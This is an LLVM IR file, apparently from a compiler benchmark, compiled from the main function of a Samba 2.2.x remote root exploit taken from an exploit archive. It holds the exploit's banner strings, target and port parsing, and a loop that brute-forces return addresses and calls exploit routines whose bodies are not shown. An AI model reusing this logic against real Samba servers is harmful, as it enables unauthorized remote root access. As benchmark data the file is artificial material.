; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22469.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22469.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [6 x i8] c"ht:p:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@target = common dso_local global i8* null, align 8
@port = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [56 x i8] c"\0A [~] 0x333hate => samba 2.2.x remote root exploit [~]\0A\00", align 1
@.str.2 = private unnamed_addr constant [56 x i8] c" [~]        coded by c0wboy ~ www.0x333.org       [~]\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c" [-] connecting to %s:%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c" [-] stating bruteforce\0A\0A\00", align 1
@START = common dso_local global i64 0, align 8
@STOP = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [19 x i8] c" [-] testing 0x%x\0A\00", align 1
@OFFSET = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [46 x i8] c" [-] uhm ... maybe samba is not vulnerable !\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  br label %8

8:                                                ; preds = %31, %2
  %9 = load i32, i32* %4, align 4
  %10 = load i8**, i8*** %5, align 8
  %11 = call i32 @getopt(i32 %9, i8** %10, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 %11, i32* %6, align 4
  %12 = load i32, i32* @EOF, align 4
  %13 = icmp ne i32 %11, %12
  br i1 %13, label %14, label %32

14:                                               ; preds = %8
  %15 = load i32, i32* %6, align 4
  switch i32 %15, label %26 [
    i32 116, label %16
    i32 112, label %18
    i32 104, label %21
  ]

16:                                               ; preds = %14
  %17 = load i8*, i8** @optarg, align 8
  store i8* %17, i8** @target, align 8
  br label %31

18:                                               ; preds = %14
  %19 = load i8*, i8** @optarg, align 8
  %20 = call i32 @atoi(i8* %19)
  store i32 %20, i32* @port, align 4
  br label %31

21:                                               ; preds = %14
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @usage(i8* %24)
  br label %26

26:                                               ; preds = %14, %21
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @usage(i8* %29)
  br label %31

31:                                               ; preds = %26, %18, %16
  br label %8

32:                                               ; preds = %8
  %33 = load i32, i32* %4, align 4
  %34 = icmp eq i32 %33, 1
  br i1 %34, label %38, label %35

35:                                               ; preds = %32
  %36 = load i8*, i8** @target, align 8
  %37 = icmp eq i8* %36, null
  br i1 %37, label %38, label %43

38:                                               ; preds = %35, %32
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @usage(i8* %41)
  br label %43

43:                                               ; preds = %38, %35
  %44 = load i32, i32* @stdout, align 4
  %45 = call i32 (i32, i8*, ...) @fprintf(i32 %44, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0))
  %46 = load i32, i32* @stdout, align 4
  %47 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.2, i64 0, i64 0))
  %48 = load i32, i32* @stdout, align 4
  %49 = load i8*, i8** @target, align 8
  %50 = load i32, i32* @port, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i8* %49, i32 %50)
  %52 = load i32, i32* @stdout, align 4
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  %54 = load i64, i64* @START, align 8
  store i64 %54, i64* %7, align 8
  br label %55

55:                                               ; preds = %66, %43
  %56 = load i64, i64* %7, align 8
  %57 = load i64, i64* @STOP, align 8
  %58 = icmp uge i64 %56, %57
  br i1 %58, label %59, label %70

59:                                               ; preds = %55
  %60 = load i32, i32* @stdout, align 4
  %61 = load i64, i64* %7, align 8
  %62 = call i32 (i32, i8*, ...) @fprintf(i32 %60, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i64 %61)
  %63 = load i64, i64* %7, align 8
  %64 = call i32 @hate(i64 %63)
  %65 = call i32 (...) @exploit()
  br label %66

66:                                               ; preds = %59
  %67 = load i64, i64* @OFFSET, align 8
  %68 = load i64, i64* %7, align 8
  %69 = sub i64 %68, %67
  store i64 %69, i64* %7, align 8
  br label %55

70:                                               ; preds = %55
  %71 = load i32, i32* @stdout, align 4
  %72 = call i32 (i32, i8*, ...) @fprintf(i32 %71, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.6, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @hate(i64) #1

declare dso_local i32 @exploit(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
